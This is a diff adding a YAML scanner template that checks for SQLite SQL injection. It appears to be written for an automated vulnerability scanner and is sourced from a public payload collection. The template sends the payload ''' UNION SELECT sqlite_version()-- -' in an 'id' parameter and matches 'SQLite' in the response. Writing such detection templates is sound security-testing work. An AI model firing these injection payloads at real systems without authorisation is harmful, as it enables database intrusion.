@@ -1,0 +1,23 @@
+id: patt-sqli-sqlite-err-01-id
+name: 'PATT sqli patt-sqli-sqlite-err-01 via id'
+severity: high
+type: active
+tags:
+  - sqli
+  - patt
+requires:
+  - php
+  - python
+description: 'PATT SQLite UNION sqlite_version(). [patt:patt-sqli-sqlite-err-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/SQLite%20Injection.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      id:
+        - ''' UNION SELECT sqlite_version()-- -'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SQLite'
+          - 'sqlite3'
